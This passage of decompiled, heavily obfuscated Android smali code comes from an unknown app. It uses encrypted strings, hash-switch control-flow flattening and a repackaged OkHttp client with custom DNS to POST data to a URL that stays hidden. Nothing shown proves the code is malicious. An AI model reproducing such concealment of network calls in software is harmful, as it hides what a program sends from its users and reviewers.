    const-string v2, "\u06e7\u06e8\u06e4\u06e6\u06db\u06e6\u06e4\u06e6\u06dc\u06eb\u06da\u06e1\u06eb\u06e1\u06e6\u06ec\u06d9\u06dc\u06d8\u06db\u06db\u06dc\u06d8\u06dc\u06dc\u06e1\u06d8\u06e4\u06d8\u06dc\u06d8\u06e0\u06dc\u06e0\u06ec\u06e0\u06e2\u06db\u06ec\u06da\u06df\u06e0\u06d8\u06d8\u06dc\u06e1\u06e5\u06e4\u06db\u06e4\u06df\u06d9\u06db\u06d6\u06e5\u06d8\u06da\u06eb\u06e0"

    :goto_f
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_8

    goto :goto_f

    :sswitch_17
    const-string v2, "\u06ec\u06e8\u06e2\u06e8\u06df\u06d8\u06d8\u06ec\u06df\u06ec\u06eb\u06e5\u06dc\u06df\u06df\u06d7\u06d8\u06ec\u06eb\u06db\u06e4\u06e8\u06d9\u06df\u06d6\u06e1\u06e1\u06e0\u06df\u06e5\u06eb\u06e7\u06e2\u06e5\u06e5\u06e7\u06e5\u06d8\u06df\u06e8\u06d6\u06d8\u06e7\u06e6\u06dc\u06d8"

    goto :goto_f

    :cond_2
    const-string v2, "\u06e7\u06d8\u06dc\u06e1\u06e5\u06d8\u06e2\u06e8\u06d8\u06d8\u06e5\u06e6\u06db\u06d8\u06e1\u06d6\u06dc\u06e6\u06dc\u06db\u06d6\u06d8\u06e2\u06d7\u06dc\u06dc\u06e0\u06ec\u06e6\u06e0\u06d6\u06e1\u06d9\u06e2\u06e8\u06dc\u06d8\u06e2\u06e2\u06da\u06e1\u06e2\u06d6\u06e0\u06e7\u06e5\u06d8\u06e4\u06db\u06e5\u06df\u06da\u06e0\u06e8\u06eb\u06e5"

    goto :goto_f

    :sswitch_18
    array-length v2, v4

    if-lez v2, :cond_2

    const-string v2, "\u06d9\u06ec\u06e2\u06e6\u06da\u06ec\u06e5\u06da\u06e1\u06d8\u06d6\u06ec\u06e4\u06e0\u06e7\u06dc\u06d8\u06eb\u06df\u06e1\u06da\u06eb\u06e8\u06d6\u06e1\u06d8\u06e4\u06d6\u06e6\u06db\u06da\u06d8"

    goto :goto_f

    :sswitch_19
    const-string v2, "\u06e8\u06e8\u06db\u06e7\u06e0\u06da\u06e1\u06df\u06db\u06d8\u06ec\u06e1\u06e5\u06e4\u06e8\u06e4\u06e1\u06e4\u06d6\u06e1\u06eb\u06d8\u06db\u06e1\u06d8\u06dc\u06e4\u06d8\u06e6\u06db\u06e0"

    goto/16 :goto_6

    :sswitch_1a
    const-string v2, "\u06df\u06e5\u06dc\u06e2\u06e7\u06e7\u06df\u06dc\u06d8\u06d8\u06e7\u06e1\u06ec\u06e8\u06d7\u06e2\u06d7\u06dc\u06e6\u06d6\u06eb\u06d8\u06df\u06e7\u06e0\u06e1\u06d8\u06d8\u06e1\u06db\u06d9\u06e2\u06da\u06e4\u06e5\u06dc\u06eb\u06eb\u06d8\u06df\u06e0\u06e4\u06dc\u06d9\u06db\u06d8\u06d8\u06eb\u06df\u06dc\u06d8\u06d8\u06ec\u06eb\u06dc\u06d8"

    goto/16 :goto_6

    :sswitch_1b
    const/4 v2, 0x0

    aget-object v2, v4, v2

    invoke-virtual {v2}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    move-result-object v2

    :try_start_4
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "rCu35H0yXPYYcKugIDOI8Rt3sJk=\n"

    const-string v7, "S5gMA8atGLg=\n"

    invoke-static {v5, v7}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v5, "/S8ISQ==\n"

    const-string v7, "lEFuJqsiOKs=\n"

    invoke-static {v5, v7}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    goto/16 :goto_7

    :catch_0
    move-exception v4

    :goto_10
    const-string v5, "bbiAWd4cpdXZ45wdgx1xfi660wrAbF0B\n"

    const-string v7, "igs7vmWD4Zs=\n"

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v5, v7, v8, v4}, Landroidx/base/남자;->d(Ljava/lang/String;Ljava/lang/String;Ljava/lang/StringBuilder;Ljava/lang/Exception;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "ialaDVze4Q==\n"

    const-string v7, "/sgoYzWwhhA=\n"

    invoke-static {v5, v7}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    :catch_1
    move-exception v4

    move-object v2, v3

    goto :goto_10

    :sswitch_1c
    :try_start_5
    const-string v2, "\u06d6\u06ec\u06ec\u06e5\u06e1\u06d9\u06ec\u06d8\u06d7\u06db\u06e2\u06d8\u06e6\u06e5\u06d8\u06e7\u06d8\u06e8\u06d8\u06e1\u06d9\u06d6\u06d8\u06e5\u06dc\u06e1\u06d8\u06df\u06df\u06d7\u06d6\u06e0\u06e5\u06d7\u06d9\u06e6\u06d7\u06dc\u06d6\u06d8\u06dc\u06eb\u06e7\u06ec\u06e8\u06e7\u06ec\u06db\u06d9\u06e1\u06dc\u06d8\u06e0\u06e0\u06e8\u06d8\u06df\u06df\u06e6"

    goto/16 :goto_8

    :sswitch_1d
    const v11, 0x65d50326

    const-string v2, "\u06d7\u06db\u06eb\u06db\u06ec\u06ec\u06e5\u06e2\u06e6\u06d8\u06ec\u06e6\u06da\u06e5\u06db\u06d6\u06e1\u06e1\u06e1\u06d8\u06e0\u06d8\u06ec\u06d6\u06da\u06e5\u06d8\u06da\u06e5\u06e8\u06d8\u06e2\u06e5\u06ec"

    :goto_11
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_9

    goto :goto_11

    :sswitch_1e
    const-string v2, "\u06d7\u06e5\u06d7\u06dc\u06d6\u06e2\u06d7\u06d9\u06db\u06ec\u06df\u06e5\u06d7\u06d7\u06ec\u06d9\u06e4\u06d8\u06d8\u06e4\u06db\u06df\u06d6\u06e7\u06db\u06d6\u06e1\u06e8\u06d8\u06d7\u06db\u06df\u06da\u06df\u06df\u06d9\u06d7\u06ec\u06eb\u06e6\u06e7\u06db\u06d7\u06e0\u06d8\u06d8\u06e1\u06d8\u06df\u06e4\u06e5\u06d8\u06d6\u06d8\u06d7\u06d6\u06da\u06e0"

    goto :goto_11

    :cond_3
    const-string v2, "\u06d7\u06e2\u06e5\u06e2\u06d8\u06e7\u06d8\u06db\u06e7\u06d8\u06d8\u06e0\u06e8\u06e8\u06d6\u06e2\u06ec\u06ec\u06e4\u06e6\u06e5\u06e1\u06d8\u06d8\u06da\u06d8\u06d8\u06d6\u06e2\u06e5\u06d8\u06e8\u06e2"

    goto :goto_11

    :sswitch_1f
    if-eqz v5, :cond_3

    const-string v2, "\u06e1\u06e6\u06d8\u06e0\u06e4\u06e8\u06df\u06d6\u06e7\u06d8\u06db\u06e8\u06e7\u06d9\u06da\u06dc\u06df\u06d7\u06eb\u06e5\u06ec\u06db\u06e0\u06e6\u06da\u06eb\u06d7\u06eb\u06d9\u06d7\u06e7\u06e0\u06d9\u06da\u06d9\u06e5\u06d8"

    goto :goto_11

    :sswitch_20
    const-string v2, "\u06d8\u06e1\u06e0\u06d7\u06e2\u06d6\u06e8\u06d7\u06e2\u06e5\u06e7\u06d8\u06e8\u06e5\u06e7\u06e0\u06e1\u06d8\u06d8\u06e6\u06e7\u06d8\u06e2\u06db\u06d8\u06d8\u06dc\u06d7\u06e2\u06e2\u06df\u06ec\u06e4\u06d9\u06e8\u06da\u06dc\u06dc\u06d8\u06d7\u06e6\u06da\u06e5\u06e7"
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    goto/16 :goto_8

    :sswitch_21
    const-string v2, "\u06e6\u06e8\u06e5\u06d7\u06e4\u06eb\u06d6\u06e7\u06ec\u06e6\u06e5\u06e0\u06df\u06e6\u06df\u06db\u06ec\u06e1\u06d8\u06df\u06e6\u06e8\u06d8\u06d9\u06d6\u06e8\u06e7\u06e2\u06d9\u06e1\u06e0\u06e6\u06d8"

    goto/16 :goto_8

    :sswitch_22
    :try_start_6
    new-instance v2, Ljava/util/concurrent/atomic/AtomicReference;

    invoke-direct {v2}, Ljava/util/concurrent/atomic/AtomicReference;-><init>()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :try_start_7
    new-instance v2, Lcom/shadow/okhttp3/OkHttpClient$Builder;

    invoke-direct {v2}, Lcom/shadow/okhttp3/OkHttpClient$Builder;-><init>()V

    new-instance v5, Landroidx/base/수신;

    const/4 v10, 0x0

    invoke-direct {v5, v6, v10}, Landroidx/base/수신;-><init>(Ljava/lang/String;I)V

    invoke-virtual {v2, v5}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->dns(Lcom/shadow/okhttp3/Dns;)Lcom/shadow/okhttp3/OkHttpClient$Builder;

    move-result-object v2

    new-instance v5, Lcom/shadow/okhttp3/ConnectionSpec$Builder;

    sget-object v10, Lcom/shadow/okhttp3/ConnectionSpec;->MODERN_TLS:Lcom/shadow/okhttp3/ConnectionSpec;

    invoke-direct {v5, v10}, Lcom/shadow/okhttp3/ConnectionSpec$Builder;-><init>(Lcom/shadow/okhttp3/ConnectionSpec;)V

    const/4 v10, 0x2

    new-array v10, v10, [Lcom/shadow/okhttp3/TlsVersion;

    const/4 v11, 0x0

    sget-object v12, Lcom/shadow/okhttp3/TlsVersion;->TLS_1_3:Lcom/shadow/okhttp3/TlsVersion;

    aput-object v12, v10, v11

    const/4 v11, 0x1

    sget-object v12, Lcom/shadow/okhttp3/TlsVersion;->TLS_1_2:Lcom/shadow/okhttp3/TlsVersion;

    aput-object v12, v10, v11

    invoke-virtual {v5, v10}, Lcom/shadow/okhttp3/ConnectionSpec$Builder;->tlsVersions([Lcom/shadow/okhttp3/TlsVersion;)Lcom/shadow/okhttp3/ConnectionSpec$Builder;

    move-result-object v5

    const/4 v10, 0x5

    new-array v10, v10, [Lcom/shadow/okhttp3/CipherSuite;

    const/4 v11, 0x0

    sget-object v12, Lcom/shadow/okhttp3/CipherSuite;->TLS_AES_128_GCM_SHA256:Lcom/shadow/okhttp3/CipherSuite;

    aput-object v12, v10, v11

    const/4 v11, 0x1

    sget-object v12, Lcom/shadow/okhttp3/CipherSuite;->TLS_AES_256_GCM_SHA384:Lcom/shadow/okhttp3/CipherSuite;

    aput-object v12, v10, v11

    const/4 v11, 0x2

    sget-object v12, Lcom/shadow/okhttp3/CipherSuite;->TLS_CHACHA20_POLY1305_SHA256:Lcom/shadow/okhttp3/CipherSuite;

    aput-object v12, v10, v11

    const/4 v11, 0x3

    sget-object v12, Lcom/shadow/okhttp3/CipherSuite;->TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:Lcom/shadow/okhttp3/CipherSuite;

    aput-object v12, v10, v11

    const/4 v11, 0x4

    sget-object v12, Lcom/shadow/okhttp3/CipherSuite;->TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:Lcom/shadow/okhttp3/CipherSuite;

    aput-object v12, v10, v11

    invoke-virtual {v5, v10}, Lcom/shadow/okhttp3/ConnectionSpec$Builder;->cipherSuites([Lcom/shadow/okhttp3/CipherSuite;)Lcom/shadow/okhttp3/ConnectionSpec$Builder;

    move-result-object v5

    invoke-virtual {v5}, Lcom/shadow/okhttp3/ConnectionSpec$Builder;->build()Lcom/shadow/okhttp3/ConnectionSpec;

    move-result-object v5

    invoke-static {v5}, Ljava/util/Collections;->singletonList(Ljava/lang/Object;)Ljava/util/List;

    move-result-object v5

    invoke-virtual {v2, v5}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->connectionSpecs(Ljava/util/List;)Lcom/shadow/okhttp3/OkHttpClient$Builder;

    move-result-object v2

    sget-object v5, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v10, 0xa

    invoke-virtual {v2, v10, v11, v5}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->connectTimeout(JLjava/util/concurrent/TimeUnit;)Lcom/shadow/okhttp3/OkHttpClient$Builder;

    move-result-object v2

    const-wide/16 v10, 0xa

    invoke-virtual {v2, v10, v11, v5}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->readTimeout(JLjava/util/concurrent/TimeUnit;)Lcom/shadow/okhttp3/OkHttpClient$Builder;

    move-result-object v2

    const/4 v5, 0x1

    invoke-virtual {v2, v5}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->retryOnConnectionFailure(Z)Lcom/shadow/okhttp3/OkHttpClient$Builder;

    move-result-object v2

    invoke-virtual {v2}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->build()Lcom/shadow/okhttp3/OkHttpClient;

    move-result-object v2

    const-string v5, "ctMIcDXa2w56zBYzJJTNDWSOHnMu1JcPYc8dcj/W3h93\n"

    const-string v10, "E6N4HFy5uno=\n"

    invoke-static {v5, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/shadow/okhttp3/MediaType;->get(Ljava/lang/String;)Lcom/shadow/okhttp3/MediaType;

    move-result-object v5

    invoke-static {v8, v5}, Lcom/shadow/okhttp3/RequestBody;->create(Ljava/lang/String;Lcom/shadow/okhttp3/MediaType;)Lcom/shadow/okhttp3/RequestBody;

    move-result-object v5

    new-instance v10, Lcom/shadow/okhttp3/Request$Builder;

    invoke-direct {v10}, Lcom/shadow/okhttp3/Request$Builder;-><init>()V

    invoke-virtual {v10, v6}, Lcom/shadow/okhttp3/Request$Builder;->url(Ljava/lang/String;)Lcom/shadow/okhttp3/Request$Builder;

    move-result-object v10

    invoke-virtual {v10, v5}, Lcom/shadow/okhttp3/Request$Builder;->post(Lcom/shadow/okhttp3/RequestBody;)Lcom/shadow/okhttp3/Request$Builder;

    move-result-object v5

    invoke-virtual {v5}, Lcom/shadow/okhttp3/Request$Builder;->build()Lcom/shadow/okhttp3/Request;

    move-result-object v5

    invoke-virtual {v2, v5}, Lcom/shadow/okhttp3/OkHttpClient;->newCall(Lcom/shadow/okhttp3/Request;)Lcom/shadow/okhttp3/Call;

    move-result-object v2

    invoke-interface {v2}, Lcom/shadow/okhttp3/Call;->execute()Lcom/shadow/okhttp3/Response;

    move-result-object v10

    invoke-virtual {v10}, Lcom/shadow/okhttp3/Response;->code()I

    move-result v2

    const v11, 0x7d6cc3fe

    const-string v5, "\u06e2\u06dc\u06e4\u06d9\u06d8\u06e6\u06e7\u06df\u06df\u06e7\u06e1\u06e2\u06d9\u06e4\u06da\u06db\u06e2\u06e6\u06d8\u06d7\u06eb\u06e1\u06d9\u06e0\u06d8\u06e6\u06dc\u06d7\u06e1\u06ec\u06d9\u06db\u06df\u06d8\u06d8\u06d6\u06dc\u06da\u06d7\u06d6\u06d8\u06d8\u06e1\u06d8\u06e8\u06d8\u06ec\u06e8\u06e5\u06d9\u06d8\u06d8"

    :goto_12
    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_a

    goto :goto_12

    :sswitch_23
    const v5, -0x1be0f919

    :try_start_8
    const-string v4, "\u06e2\u06d6\u06e6\u06e5\u06e4\u06e8\u06d8\u06dc\u06e8\u06d7\u06e5\u06dc\u06e4\u06d6\u06e0\u06e1\u06e8\u06e0\u06e1\u06d6\u06e6\u06d6\u06eb\u06d9\u06e1\u06e0\u06d6\u06d7\u06dc\u06e2\u06e2"

    :goto_13
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v5

    sparse-switch v11, :sswitch_data_b

    goto :goto_13

    :sswitch_24
    const-string v4, "\u06e1\u06db\u06df\u06e0\u06dc\u06d6\u06d8\u06e4\u06e6\u06e1\u06db\u06d7\u06d8\u06e6\u06db\u06e5\u06d8\u06ec\u06e1\u06e1\u06e6\u06dc\u06e6\u06e4\u06d6\u06d8\u06db\u06e0\u06e0\u06e6\u06e7\u06e6"
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_c

    goto :goto_13

    :sswitch_25
    :try_start_9
    const-string v5, "\u06eb\u06e0\u06e1\u06d8\u06d9\u06eb\u06da\u06e1\u06e6\u06e8\u06e0\u06db\u06d6\u06e7\u06dc\u06d8\u06d9\u06e4\u06e7\u06e8\u06e8\u06df\u06e5\u06eb\u06dc\u06d8\u06e4\u06d6\u06db\u06db\u06e0\u06e4\u06dc\u06e8\u06d8\u06eb\u06d6\u06e4\u06df\u06d6\u06dc\u06dc\u06ec\u06d9\u06e5\u06e1\u06d8\u06e4\u06e8\u06d6"

    goto :goto_12

    :sswitch_26
    const v12, -0xf1821e8

    const-string v5, "\u06e4\u06db\u06eb\u06e1\u06d9\u06e4\u06eb\u06db\u06db\u06dc\u06d7\u06d6\u06d8\u06e1\u06eb\u06e8\u06db\u06e2\u06e8\u06e2\u06e6\u06e8\u06d7\u06df\u06e5\u06da\u06eb\u06df\u06d9\u06e2\u06e6\u06df\u06df\u06e7\u06e5\u06e0\u06e0"

    :goto_14
    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v12

    sparse-switch v13, :sswitch_data_c

    goto :goto_14

    :sswitch_27
    const/16 v5, 0xc8

    if-ne v2, v5, :cond_4

    const-string v5, "\u06e2\u06d6\u06e5\u06d8\u06d7\u06e8\u06d7\u06dc\u06eb\u06e7\u06d9\u06d7\u06d8\u06d7\u06dc\u06ec\u06e0\u06e5\u06eb\u06eb\u06df\u06e6\u06d7\u06dc\u06e7\u06e6\u06d9\u06e7\u06d8\u06dc\u06e1\u06e8\u06d8\u06d8\u06db\u06d8\u06dc\u06d8\u06e2\u06e8\u06e2\u06e7\u06d8\u06dc\u06e8\u06d6\u06d8\u06e2\u06d9\u06d6\u06e0\u06e7\u06d9\u06d8\u06da\u06e4"

    goto :goto_14

    :cond_4
    const-string v5, "\u06dc\u06ec\u06ec\u06e7\u06d7\u06e8\u06db\u06e1\u06e4\u06d6\u06d6\u06d9\u06d9\u06e5\u06d8\u06e2\u06e0\u06d7\u06da\u06e0\u06e1\u06e8\u06d9\u06dc\u06d8\u06d6\u06e5\u06df\u06d9\u06e7\u06eb"

    goto :goto_14

    :sswitch_28
    const-string v5, "\u06e8\u06e2\u06e6\u06e2\u06e8\u06e1\u06d8\u06da\u06e6\u06db\u06e4\u06da\u06e2\u06e1\u06e7\u06e4\u06e2\u06d6\u06d6\u06e0\u06e4\u06d6\u06d9\u06d8\u06dc\u06d8\u06e5\u06e6\u06da\u06e2\u06e7\u06e1\u06d8\u06dc\u06df\u06e0\u06d7\u06e2\u06e6\u06e2\u06d9\u06e2\u06e6\u06d6\u06dc\u06d7\u06e8\u06e1\u06d8\u06df\u06e1\u06e0\u06d7\u06e7\u06e1\u06d8\u06db\u06e8\u06e7"

    goto :goto_14

    :sswitch_29
    const-string v5, "\u06d8\u06eb\u06e1\u06d8\u06e1\u06d8\u06ec\u06df\u06e7\u06da\u06e7\u06e5\u06e6\u06d8\u06d9\u06e0\u06e6\u06e2\u06da\u06dc\u06e5\u06d7\u06e1\u06d8\u06eb\u06e8\u06dc\u06db\u06d7\u06d6\u06d8\u06df\u06e8\u06d8\u06df\u06dc\u06e8\u06d8\u06dc\u06d6\u06e1\u06eb\u06e2\u06e5\u06d9\u06df\u06d6\u06d8"
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_2

    goto :goto_12

    :sswitch_2a
    const-string v5, "\u06d8\u06eb\u06db\u06e5\u06eb\u06e8\u06eb\u06e7\u06e0\u06e5\u06e7\u06e6\u06df\u06e1\u06ec\u06df\u06eb\u06e6\u06d8\u06d9\u06e6\u06e1\u06d8\u06e0\u06db\u06db\u06d8\u06d7\u06d6\u06d8\u06d9\u06e1\u06e5"

    goto :goto_12

    :sswitch_2b
    :try_start_a
    const-string v4, "\u06da\u06e7\u06e8\u06d8\u06e1\u06e5\u06e8\u06d8\u06d8\u06eb\u06d6\u06eb\u06db\u06e0\u06db\u06e8\u06dc\u06d8\u06d8\u06e0\u06e8\u06df\u06eb\u06e6\u06e2\u06dc\u06df\u06db\u06d6\u06d9\u06e8\u06db\u06dc\u06ec\u06d9\u06e8\u06d9\u06db\u06d8\u06d8\u06d6\u06e4\u06d6\u06e0\u06e2\u06d8"

    goto :goto_13

    :sswitch_2c
    const v11, -0x6ac8f7a5

    const-string v4, "\u06d7\u06eb\u06df\u06ec\u06eb\u06e8\u06d8\u06e7\u06ec\u06e1\u06d8\u06e7\u06e1\u06da\u06e5\u06e1\u06d6\u06eb\u06e6\u06e6\u06e5\u06dc\u06e0\u06e1\u06e7\u06da\u06e4\u06d9\u06e4\u06e5\u06d7\u06dc\u06e6\u06eb\u06e5\u06d9\u06e8\u06db\u06d8\u06d8\u06dc\u06dc\u06e5\u06d8\u06e1\u06d9\u06eb\u06e2\u06e2\u06e4\u06e8\u06d8\u06eb\u06eb\u06d8"

    :goto_15
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_d

    goto :goto_15

    :sswitch_2d
    const-string v4, "\u06e7\u06e8\u06e1\u06d8\u06e8\u06eb\u06e2\u06db\u06e5\u06e7\u06e4\u06e2\u06db\u06e1\u06ec\u06e6\u06db\u06e1\u06d6\u06db\u06e7\u06e1\u06e4\u06ec\u06e7\u06d9\u06e1\u06e1\u06d8\u06e4\u06e4\u06e8\u06d8"

    goto :goto_15

    :cond_5
    const-string v4, "\u06d9\u06d7\u06d8\u06d8\u06d8\u06e6\u06dc\u06d8\u06d8\u06da\u06eb\u06ec\u06d8\u06d8\u06e4\u06da\u06e5\u06e5\u06e5\u06e7\u06d8\u06e6\u06df\u06ec\u06dc\u06ec\u06d6\u06da\u06e0\u06ec\u06eb\u06d8\u06e2"

    goto :goto_15

    :sswitch_2e
    invoke-virtual {v10}, Lcom/shadow/okhttp3/Response;->body()Lcom/shadow/okhttp3/ResponseBody;

    move-result-object v4

    if-eqz v4, :cond_5

    const-string v4, "\u06e0\u06df\u06d8\u06d8\u06d6\u06e1\u06e4\u06e7\u06dc\u06db\u06e0\u06e5\u06e5\u06ec\u06e2\u06e1\u06eb\u06e4\u06eb\u06df\u06e1\u06d8\u06da\u06d8\u06e7\u06e6\u06df\u06d6\u06e1\u06e5"

    goto :goto_15

    :sswitch_2f
    const-string v4, "\u06dc\u06e1\u06e5\u06d8\u06dc\u06dc\u06e8\u06d8\u06d9\u06e1\u06d9\u06e8\u06df\u06e5\u06d8\u06e0\u06e4\u06dc\u06d8\u06db\u06d6\u06d8\u06e7\u06ec\u06d8\u06e4\u06e4\u06e1\u06d8\u06eb\u06e5\u06e5\u06d9\u06e4\u06e7\u06df\u06ec\u06e1\u06d8\u06df\u06e6\u06d9\u06da\u06dc\u06e1\u06e1\u06e5\u06d8"

    goto :goto_13

    :sswitch_30
    invoke-virtual {v10}, Lcom/shadow/okhttp3/Response;->body()Lcom/shadow/okhttp3/ResponseBody;

    move-result-object v4

    invoke-virtual {v4}, Lcom/shadow/okhttp3/ResponseBody;->string()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v9, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_c

    const/4 v4, 0x1

    move v5, v2

    goto/16 :goto_a

    :catch_2
    move-exception v5

    move v2, v4

    :goto_16
    :try_start_b
    invoke-virtual {v5}, Ljava/lang/Throwable;->printStackTrace()V

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "80kMYZsdq1Mn4e4p0wLBJRiwuTi+W/FPUr/nZoAk\n"

    const-string v11, "twdfiTy+Tc0=\n"

    invoke-static {v10, v11}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v5, "5qdYxb8=\n"

    const-string v10, "g9Uqqs374zQ=\n"

    invoke-static {v5, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_4

    const/4 v4, 0x0

    const/4 v5, 0x0

    aget v5, p4, v5

    add-int/lit8 v5, v5, 0x1

    aput v5, p4, v4

    goto/16 :goto_9

    :sswitch_31
    const-string v2, "\u06dc\u06db\u06d6\u06da\u06e0\u06ec\u06da\u06e7\u06d6\u06d9\u06e0\u06e5\u06e5\u06e6\u06d6\u06d8\u06d7\u06e1\u06d6\u06d8\u06e7\u06ec\u06dc\u06d8\u06eb\u06ec\u06d7\u06e5\u06ec\u06e8\u06d8\u06e8\u06e6\u06d8\u06d8\u06dc\u06d7\u06dc\u06d8\u06eb\u06e8\u06e8\u06d8"

    goto/16 :goto_b

    :sswitch_32
    const v11, -0x669bf30e

    const-string v2, "\u06e2\u06da\u06da\u06e6\u06ec\u06dc\u06e2\u06e2\u06eb\u06e2\u06d9\u06d8\u06d8\u06e0\u06db\u06d6\u06d8\u06db\u06e4\u06d8\u06d8\u06db\u06db\u06e4\u06d9\u06da\u06e0\u06e4\u06d6\u06e6\u06eb\u06dc\u06df\u06e5\u06dc\u06d8\u06d8\u06e5\u06d9\u06d8\u06e4\u06e4\u06dc\u06d8\u06e7\u06e6\u06e4\u06d6\u06eb\u06e5\u06e6\u06ec\u06d8\u06d8"

    :goto_17
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_e

    goto :goto_17

    :sswitch_33
    if-nez v4, :cond_6

    const-string v2, "\u06eb\u06e0\u06e8\u06d8\u06e2\u06e5\u06e5\u06e1\u06e7\u06e7\u06d6\u06d9\u06e2\u06e6\u06d8\u06d6\u06d8\u06e7\u06d9\u06e6\u06d8\u06e2\u06da\u06eb\u06d9\u06eb\u06d6\u06dc\u06dc\u06d8\u06db\u06df\u06e5\u06d8\u06d8\u06d7\u06d8\u06d8\u06db\u06e1\u06d8\u06d8\u06e7\u06dc\u06d9\u06e8\u06d7\u06da\u06da\u06e2\u06da\u06ec\u06d9\u06d7"

    goto :goto_17

    :cond_6
    const-string v2, "\u06d7\u06d6\u06e5\u06d8\u06e5\u06dc\u06e8\u06d8\u06d7\u06dc\u06d6\u06e2\u06ec\u06eb\u06d9\u06db\u06df\u06d8\u06d7\u06e2\u06d7\u06e1\u06df\u06d8\u06e2\u06d8\u06d8\u06d7\u06d9\u06e8\u06d8\u06e8\u06e1\u06e2\u06e2\u06e4\u06d7\u06e8\u06df\u06da"

    goto :goto_17

    :sswitch_34
    const-string v2, "\u06d6\u06d7\u06dc\u06d8\u06e7\u06d9\u06da\u06df\u06e1\u06dc\u06e5\u06d7\u06e5\u06d6\u06e6\u06e1\u06d8\u06e6\u06e1\u06e1\u06d8\u06e4\u06eb\u06d6\u06e1\u06e1\u06d8\u06d8\u06e1\u06e8\u06dc\u06e4\u06d9\u06dc\u06d8\u06d8\u06e8\u06d8\u06d7\u06e6\u06ec\u06d7\u06d6\u06e0\u06e0\u06db\u06dc\u06d8"

    goto :goto_17

    :sswitch_35
    const-string v2, "\u06e2\u06e5\u06d8\u06eb\u06dc\u06da\u06e6\u06e5\u06df\u06e2\u06ec\u06e4\u06dc\u06e0\u06d9\u06d7\u06dc\u06dc\u06d8\u06e2\u06e6\u06d6\u06d6\u06e6\u06e8\u06e2\u06e1\u06e0\u06e5\u06e8\u06d8"

    goto/16 :goto_b

    :sswitch_36
